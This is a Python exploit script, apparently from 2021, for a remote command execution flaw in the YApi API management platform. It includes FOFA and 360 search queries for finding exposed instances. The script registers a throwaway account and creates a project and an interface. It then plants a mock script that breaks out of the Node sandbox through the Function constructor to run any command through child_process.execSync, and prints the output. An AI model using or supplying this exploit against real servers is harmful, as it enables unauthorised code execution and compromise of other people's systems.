import sys
import requests
import random
import urllib3
urllib3.disable_warnings()

"""
    2021-7-9 04:56:36 
    Yapi任意任意命令执行  By j2ekim
    fofa ：app="YApi"
    360 ：app:"YApi 可视化接口管理平台"
"""

def ram_str(str_num):
    str1 = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
    ran_string = ''

    for i in range(str_num):
        num = random.randint(0, len(str1) - 1)
        ran_string += str1[num]
    return ran_string

reg_mail = ram_str(8) + "@" + ram_str(6) +".com"
reg_username = ram_str(6)
reg_passwd = ram_str(10)
path_name = ram_str(6)


def Yapi_vuln(vul_url,command):
    s = requests.session()

    reg_url = f"{vul_url}api/user/reg"
    # print(reg_url)
    reg_data ={
        "email":f"{reg_mail}","password":f"{reg_passwd}","username":f"{reg_username}"
    }
    reg_user = s.post(url=reg_url,data=reg_data,verify=False)
    if "member" in reg_user.text:
        print(f"注册成功\n"
              f"用户名：{reg_mail}"
              f"密码：{reg_passwd}")
    req_reps=reg_user.json()

    #获取注册用户的uid
    uid = req_reps["data"]["uid"]
    # print(uid)

    # 判断是否登录
    user_info= f"{vul_url}api/user/find?id={uid}"
    get_user_info = s.get(url=user_info)

    # 获取当前用户group_id
    get_user_group_id_url = f"{vul_url}api/group/get_mygroup"
    get_user_group_id =s.get(url=get_user_group_id_url)
    group_id = get_user_group_id.json()["data"]["_id"]

    # 添加项目
    add_project_data = {"name":f"{path_name}","group_id":f"{group_id}","icon":"code-o","color":"green","project_type":"private"}
    add_project_url= f"{vul_url}api/project/add"
    add_project = s.post(url=add_project_url,data=add_project_data,verify=False)
    # print(add_project.json())
    project_id_json=add_project.json()
    project_id=project_id_json["data"]["_id"]


    # 添加接口
    add_interface_url = f"{vul_url}api/interface/add"
    add_interface_data = {"method":"GET","catid":"4987","title":f"{path_name}","path":f'/Yapi_test_{path_name}',"project_id":f"{project_id}"}
    add_interface = s.post(url=add_interface_url,data=add_interface_data,verify=False)

    # # 设置全局变量
    up_project_url = f"{vul_url}api/project/up"
    up_project_data = {"id":f"{project_id}",f"project_mock_script":f"const sandbox = this\nconst ObjectConstructor = this.constructor\nconst FunctionConstructor = ObjectConstructor.constructor\nconst myfun = FunctionConstructor('return process')\nconst process = myfun()\nmockJson = process.mainModule.require(\"child_process\").execSync(\"{command}\").toString()","is_mock_open":"true"}
    up_project = s.post(url=up_project_url,data=up_project_data,verify=False)

    # # 访问漏洞地址
    vuln_add = s.get(url=f"{vul_url}mock/{project_id}/Yapi_test_{path_name}")
    print(vuln_add.text)
    # 保存到文件中
    # with open("YApi.txt",mode="a",encoding="utf-8") as f:
    #     f.write(vul_url)

def reg_status(url):
    try:
        reg_url = f"{url}api/user/status"
        # print(reg_url)
        reps_reg_status = requests.get(url=reg_url,verify=False,headers={"Referer": f"{url}/login"},timeout=5)
        reg_status_json = reps_reg_status.json()
        reg_statu = reg_status_json["canRegister"]
        return reg_statu
    except:
        print("网络连接超时")
        sys.exit()

def main():
    url = input("url：")
    if "http" not in url:
        url= "http://"+ url
    elif url == "":
        sys.exit("未输入网址")
    command = input("command:")
    if command == "":
        print("command不能为空")
        sys.exit("")
    # 判断是否开启注册
    # reg_status()
    site_reg_status = reg_status(url)
    if  site_reg_status == False:
        print("管理员已禁止注册")
        sys.exit()
    else:
        Yapi_vuln(url,command)

if __name__ == '__main__':
    print("""
    ===========================================
        Yapi任意任意命令执行漏洞  By j2ekim
        fofa ：app="YApi"
        360 ：app:"YApi 可视化接口管理平台"
        url: http://x.x.x.x/
    ===========================================
    """)
    main()
